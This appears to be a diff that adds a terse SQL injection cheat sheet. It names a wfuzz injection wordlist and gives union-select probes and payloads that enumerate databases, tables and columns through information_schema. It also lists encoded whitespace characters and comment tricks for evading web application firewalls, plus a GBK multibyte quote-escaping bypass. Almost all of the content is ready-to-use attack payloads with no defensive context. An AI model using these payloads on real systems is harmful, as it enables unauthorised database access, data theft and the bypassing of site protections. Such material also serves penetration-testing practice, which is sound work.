@@ -1,0 +1,32 @@
+SQLi wordlist
+
+/usr/share/wfuzz/wordlist/injections/wordlist
+
+cheatsheet:
+
+' union select 1,2,.... ##
+' union select 1,2,.... --
+
+until you dont get an error, then refer to sqli payload:
+
+' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c)+fRoM+information_schema.schemata--
+UniOn Select 1,2,gRoUp_cOncaT(0x7c,table_name,0x7C)+fRoM+information_schema.tables+wHeRe+table_schema--
+UniOn Select 1,2,gRoUp_cOncaT(0x7c,column_name,0x7C)+fRoM+information_schema.columns+wHeRe+table_name--
+
+Whitespace replacements to evade WAF:
+
+%09
+%0A
+%0B
+%0C
+%0D
+%A0
+%20
+
+'/*!50000or*/1%3d1##
+
+Example of Simplified Chinese char(using GBK charset)  to gen '
+%bf%27or%201%3d1##
+OR
+\xBF'
+%bf%27 or 1=1 --
